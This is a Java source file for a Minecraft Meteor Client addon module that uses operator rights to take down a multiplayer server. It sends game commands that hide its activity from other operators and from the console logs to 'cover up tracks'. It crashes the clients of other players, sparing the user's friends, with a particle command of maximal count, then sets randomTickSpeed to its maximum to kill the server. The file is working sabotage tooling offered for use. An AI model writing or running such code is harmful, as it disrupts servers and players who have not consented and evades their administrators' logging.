package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.friends.Friend;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.PlayerListEntry;
import pwn.noobs.trouserstreak.Trouser;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class OPServerKillModule extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    public final Setting<Boolean> dontBeStupid = sgGeneral.add(new BoolSetting.Builder()
            .name("Restrict Singleplayer Use")
            .description("Does not allow you to screw up your singleplayer worlds. Turn off for 'testing' purposes.")
            .defaultValue(true)
            .build()
    );
    public final Setting<Boolean> notOP = sgGeneral.add(new BoolSetting.Builder()
            .name("Toggle Module if not OP")
            .description("Turn this off to prevent the bug of module always being turned off when you join server.")
            .defaultValue(false)
            .build()
    );
    private final Setting<Boolean> sendCommandFeedback = sgGeneral.add(new BoolSetting.Builder()
            .name("turn off sendCommandFeedback")
            .description("Makes commands invisible to other operators.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> logAdminCommands = sgGeneral.add(new BoolSetting.Builder()
            .name("turn off logAdminCommands")
            .description("Hides the kill command from console logs.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> crashOtherPlayers = sgGeneral.add(new BoolSetting.Builder()
            .name("crash-other-players")
            .description("Crashes everyone else's minecraft client. Don't forget to enable Anti Crash in Rejects!")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> nocrashfrend = sgGeneral.add(new BoolSetting.Builder()
            .name("dont-crash-friends")
            .description("Crashes everyone excluding your friends and you.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Integer> tickdelay = sgGeneral.add(new IntSetting.Builder()
            .name("Tick Delay")
            .description("The delay between commands sent.")
            .defaultValue(1)
            .min(0)
            .build()
    );
    private final Setting<Integer> killvalue = sgGeneral.add(new IntSetting.Builder()
            .name("randomTickSpeed (kill value)")
            .description("This is what kills server. Max value is best.")
            .defaultValue(2147483647)
            .min(0)
            .max(2147483647)
            .sliderRange(0, 2147483647)
            .build()
    );
    public OPServerKillModule() {
        super(Trouser.Main, "OPServerKillModule", "Runs a set of commands to disable a server. Requires OP. (ONLY USE IF YOU'RE 100% SURE)");
    }

    private int ticks=0;
    private CopyOnWriteArrayList<PlayerListEntry> players;

    @Override
    public void onActivate() {
        if (dontBeStupid.get() && mc.getInstance().isInSingleplayer()) {
            toggle();
            error("Don't break your single player world, it sucks.");
        }
        if (notOP.get() && !(mc.player.hasPermissionLevel(2)) && mc.world.isChunkLoaded(mc.player.getChunkPos().x, mc.player.getChunkPos().z)) {
            toggle();
            error("Must have permission level 2 or higher");
        }
            ticks=0;
    }

    @EventHandler
    public void onTick(TickEvent.Pre event) {
        ticks++;
        if (sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            }
            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
            }
            if (ticks == 3*tickdelay.get()){ //kill server
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
            if (ticks > 3*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == 1*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
            }
            if (ticks == 2*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
            if (ticks > 2*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == 1*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            }
            if (ticks == 2*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
            if (ticks > 2*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (!sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
            if (ticks == 1*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
            if (ticks > 1*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
            if (ticks == 1*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
            }
            if (ticks == 2*tickdelay.get()){ //crash players
                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
                else if (nocrashfrend.get()) {
                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                    List<String> friendNames = new ArrayList<>();
                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
                    for(PlayerListEntry player : players) {
                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
                    }
                    String friendsString = String.join(",", friendNames);
                    String thecommand = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                    if (thecommand.length()<=256){
                        ChatUtils.sendPlayerMsg(thecommand);
                    }
                    else {
                        error("Crash all players command is too long, you have too many friends online.");
                    }
                }
            }
            if (ticks == 3*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
            if (ticks > 3*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && crashOtherPlayers.get()){
            if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            }
            if (ticks == 2*tickdelay.get()){ //crash players
                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
                else if (nocrashfrend.get()) {
                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                    List<String> friendNames = new ArrayList<>();
                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
                    for(PlayerListEntry player : players) {
                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
                    }
                    String friendsString = String.join(",", friendNames);
                    String thecommand2 = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                    if (thecommand2.length()<=256){
                        ChatUtils.sendPlayerMsg(thecommand2);
                    }
                    else {
                        error("Crash all players command is too long, you have too many friends online.");
                    }
                }
            }
            if (ticks == 3*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
            if (ticks > 3*tickdelay.get()){
                toggle();
                error("Server Killed.");
            }
        } else if (sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
            if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            }
            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
            }
            if (ticks == 3*tickdelay.get()){ //crash players
                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
                else if (nocrashfrend.get()) {
                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                    List<String> friendNames = new ArrayList<>();
                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
                    for(PlayerListEntry player : players) {
                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
                    }
                    String friendsString = String.join(",", friendNames);
                    String thecommand2 = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                    if (thecommand2.length()<=256){
                        ChatUtils.sendPlayerMsg(thecommand2);
                    }
                    else {
                        error("Crash all players command is too long, you have too many friends online.");
                    }
                }
            }
            if (ticks == 4*tickdelay.get()){ //kill server
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
            if (ticks > 4*tickdelay.get()){ //kill server
                toggle();
                error("Server Killed.");
            }
        }
    }
}